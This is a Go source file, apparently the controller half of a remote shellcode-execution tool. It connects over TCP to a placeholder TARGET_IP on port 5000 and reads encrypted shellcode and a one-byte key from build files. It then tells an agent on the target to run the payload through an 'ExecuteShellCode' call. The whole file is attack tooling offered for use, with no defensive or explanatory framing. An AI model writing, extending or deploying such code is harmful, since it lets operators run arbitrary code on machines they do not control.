// src/controller/main.go
//go:build !windows
// +build !windows

package main

import (
	"encoding/binary"
	"net"
	"os"
)

func callRemoteFunc(conn net.Conn, dllFunc string, payload []byte, key byte) error {
	if _, err := conn.Write(append([]byte(dllFunc), 0)); err != nil {
		return err
	}
	
	if _, err := conn.Write([]byte{key}); err != nil {
		return err
	}
	
	lenBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(lenBuf, uint32(len(payload)))
	if _, err := conn.Write(lenBuf); err != nil {
		return err
	}
	
	_, err := conn.Write(payload)
	return err
}

func main() {
	conn, err := net.Dial("tcp", "TARGET_IP:5000")
	if err != nil {
		panic(err)
	}
	defer conn.Close()

	shellcode, err := os.ReadFile("build/linux/shellcode.bin")
	if err != nil {
		panic(err)
	}

	keyData, err := os.ReadFile("build/linux/shellcode.key")
	if err != nil || len(keyData) == 0 {
		panic("missing or invalid encryption key")
	}

	if err := callRemoteFunc(conn, "ExecuteShellCode", shellcode, keyData[0]); err != nil {
		panic(err)
	}
}